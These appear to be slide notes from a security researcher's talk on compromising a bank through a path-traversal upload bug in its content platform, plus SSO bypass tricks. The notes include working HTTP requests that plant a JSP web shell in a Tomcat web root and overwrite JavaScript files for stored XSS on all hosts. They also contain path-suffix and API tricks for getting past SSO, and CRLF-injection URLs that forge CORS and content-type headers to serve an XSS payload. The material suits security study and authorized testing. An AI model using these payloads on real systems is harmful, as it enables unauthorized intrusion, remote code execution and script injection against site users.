# Hacking a Bank by Finding a 0day
In collaboration with @infosec_au

## Building a Proof of Concept (PoC)
### HTTP Request
```http
POST /api/content/ HTTP/1.1
Host: re.local:8443
User-Agent: curl/7.64.1
Accept: */*
Content-Length: 1162
Content-Type: multipart/form-data; boundary=------------------------aadc326f7ae3eac3
Connection: close

--------------------------aadc326f7ae3eac3
Content-Disposition: form-data; name="name"; filename="../../../../../../../../../srv/dotserver/tomcat-9.0.41/webapps/ROOT/html/js/dojo/a.jsp"
Content-Type: text/plain

...JSP SHELL CODE...
--------------------------aadc326f7ae3eac3--
```

### Path Traversal File Upload
The above request demonstrates a path traversal attack, allowing the upload of a JSP shell to the web root directory.

## Back to the Bank
### Web Directory Not Writable
- **500 Error + Size 0**: The file was written but not accessible.
- **500 Error + "could not be created"**: The directory does not exist.
- **500 Error + "denied"**: The directory exists but lacks write permissions.

### Alternative Solutions for Remote Code Execution (RCE)
- Replacing JAR files
- Replacing system files
- Adding system configuration via files

### Proving Greater Impact
- **Gadget to Replace JavaScript Files**:
  - Open the JavaScript file and look for the ETag in the headers.
  - Upload the file using the following format:
    ```http
    filename="../FIRST-CHAR/SECOND-CHAR/FULL-ETAG/fileAsset/FILE-NAME"
    ```

### Example ETag
```http
Etag: 23f890f7-ac11-30fe-1e50-a4f446a11211
```

### PoC for JavaScript File Replacement
```http
POST /api/content/ HTTP/1.1
Host: host
Content-Type: multipart/form-data; boundary=------------------------aadc326f7ae3eac3
Content-Length: 37406

--------------------------aadc326f7ae3eac3
Content-Disposition: form-data; name="name"; filename="../2/3/23f890f7-ac22-40fe-9e50-a5f446a66255/fileAsset/positiveImpactInternetJs.js"
Content-Type: text/plain

console.log('hussein98d-shubs-poc');
--------------------------aadc326f7ae3eac3--
```

### Result
- Stored Cross-Site Scripting (XSS) on all hosts.
- Ability to overwrite index files and other critical files.

## SSO Bypass Techniques
### Introduction
Most organizations use Single Sign-On (SSO) for internal panels and restricted resources. Here are some techniques to bypass SSO:

### Fuzzing
- **Tools**: FFuF, Arjun, Param Miner
- **Example**:
  - `https://admin.org.com` (Okta)
  - `https://admin.org.com/internal.php?id=1` (200 OK)
  - `https://admin.org.com/blabla` (404 Not Found)
  - `https://admin.org.com/internal.php` (301 Redirect)

### APIs
- **Example**:
  - `https://admin.org.com` (200 OK then redirect to SSO)
  - `view-source:https://admin.org.com/api/admin/users`
  - `https://admin.org.com/api/admin/users` (200 OK)

### Less Known Techniques
- **Wordlist**: [Link](https://gist.github.com/securifera/e7eed730cbe1ce43d0c29d7cd2d582f4)
- **Brute Force**:
  - `https://org.com/admin/$FUZZ$`
- **File Access**:
  - `https://org.com/admin/;.jpg`
  - `https://org.com/admin/valid-file.jsp;.jpg`

### Fancy Vectors
- **Extension Brute-Force**:
  - `https://internal.org.com/test.js` (SSO)
  - `https://internal.org.com/test.jpg` (404 Not Found)
  - `https://internal.org.com/;.jpg` (200 OK)
- **CNAME Lookup**:
  - `dig CNAME internal.org.com`
  - `gau â€“subs 3rdparty.com`
  - `hey.3rdparty.com/authentication/register`
  - `https://internal.org.com/authentication/register` (200 OK)
- **URL Gathering**:
  - Use Wayback Machine and AlienVault URLs to find similarities.

### Chaining Bugs for XSS
- **Target URL**: `https://org.com/auth/`
- **Parameters**:
  - `inc` parameter is expected.
  - Hostname must end with `.org.com`.
  - Path should start with `/includes/js-cdn`.

### Subdomain Takeover
- **Subdomain**: `subdomain.org.com/includes/js-cdn/file.js`
- **Payload**: `alert();`

### CRLF Injection
- **Example**:
  - `support.org.com/%0d%0aTest:Testing`
  - `support.org.com/includes/js-cdn/x.js?%0d%0aTest:Testing`
  - `support.org.com/includes/js-cdn/x.js?%250D%250AContent-Type:application/javascript%250D%250A%250D%250Aalert();`
- **Solution for CORS**:
  - `Org.com/auth/?inc=support.org.com/includes/js-cdn/x.js?%250D%250AAccess-Control-Allow-Origin:%20https:%2F%2Forg.com%250D%250AContent-Type:application/javascript%250D%250A%250D%250Aalert();`

### Wrap-Up
- Find another subdomain vulnerable to CRLF.
- Use CRLF to allow origin.
- Set content type using CRLF.
- Write an XSS payload on the page.

### Conclusion
For more information or if you need a penetration test, visit [WebImmunify.com](https://webimmunify.com).

Thank you! Any questions?

@Hussein98D

Discovered vulnerabilities | Yet to be found vulnerabilities
--- | ---
We provide pentests! Visit [WebImmunify.com](https://webimmunify.com) | October 2022